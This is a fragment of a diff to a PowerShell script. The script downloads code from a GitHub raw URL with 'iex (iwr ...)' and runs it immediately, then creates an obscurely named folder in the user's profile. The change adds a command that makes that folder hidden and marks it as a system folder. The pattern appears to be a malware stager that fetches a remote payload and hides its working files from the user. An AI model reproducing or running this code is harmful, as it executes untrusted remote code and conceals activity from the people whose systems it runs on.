@@ -3,7 +3,7 @@ iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/hidden
 
 $dir = "$env:userprofile\150F4013"
 New-Item -ItemType Directory -Path $dir
-
+attrib +h +s $dir
 
 $temp = "$dir\temp"
 New-Item -ItemType Directory -Path $temp
